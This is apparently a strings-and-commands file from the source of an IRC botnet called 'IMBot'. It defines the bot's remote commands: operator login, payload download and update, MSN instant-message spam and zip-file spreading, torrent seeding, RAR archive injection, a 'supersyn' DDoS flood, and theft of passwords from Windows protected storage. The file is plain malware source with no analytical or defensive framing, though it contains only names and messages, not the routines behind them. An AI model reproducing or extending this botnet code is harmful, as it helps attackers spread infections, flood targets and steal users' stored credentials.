/*
 ___    _____  __________          __  
|   |  /     \ \______   \  ____ _/  __
|   | /  \ /  \ |    |  _/ /  _ \\   __\
|   |/    Y    \|    |   \(  <_> )|  |
|___|\____|__  /|______  / \____/ |__|
             \/        \/
*/
///////////////////////////////////////////////
// Commands
const char get_auth[]			= "login";
const char cmd_join[]			= "join";
const char cmd_part[]			= "part";
const char get_mnd[]			= "dl.start";
const char cmd_dlstop[]			= "dl.stop";
const char get_upd[]			= "update";
const char cmd_remove[]			= "remove";
const char cmd_msnspam[]		= "msn.msg";
const char cmd_msnemail[]		= "msn.msgemail";
const char cmd_msnstop[]		= "msn.stop";
const char cmd_msnsendzip[]		= "msn.sendzip";
const char cmd_msnstopzip[]		= "msn.stopzip";
const char cmd_seed[]			= "seed.utorrent";
const char cmd_winrar[]			= "rar.inject";
const char cmd_ddos_supersyn[]	= "supersyn";
const char cmd_pstore_1[]	    = "pstore";
const char cmd_pstore_2[]	    = "pstore.search";
const char cmd_pstore_3[]	    = "pstore.stop";

///////////////////////////////////////////////
/*
// Fake commands
const char cmd_fakelogin[]		= "fake1";
const char cmd_fake_remove[]    = "fake2";
const char cmd_fakedownload[]   = "fake3";
const char cmd_fakeupdate[]     = "fake4";
*/
///////////////////////////////////////////////
// Command Titles
char main_title[]		= "[IMBot]:";
char threads_title[]	= "[Thread]:";
char process_title[]	= "[Proc]:";
char irc_title[]		= "[Irc]:";
char download_title[]	= "[Dl]:";
char update_title[]	    = "[Update]:";
char imspread_title[]	= "[Msn]:";
char ddos_title[]		= "[DDOS]:";

///////////////////////////////////////////////
// Strings
char str_auth_good[]	= "%s Activated.";
char str_auth_full[]	= "%s Fail.";
char str_thread_alr[]	= "%s %s already running: <%d>";
char str_thread_fail[]	= "%s Fail start %s, err: <%d>";
char str_quit_upd[]		= "gettin new bin.";
char str_kick_msg[]		= "Cant kick me %s :P";
char str_auth_ali[]		= "%s logged in.";
char str_quit_rem[]		= "Removed by: %s!%s@%s";
char str_noadvapi[]		= "%s Advapidll Failed.";
char str_nopstore[]		= "%s PStoredll Failed.";
char str_main_thread[]	= "%s Main thread.";
char str_bad_format[]	= "%s mis param.";
char str_msn_msg[]		= "Msn message sent to: %s contacts.";
///////////////////////////////////////////////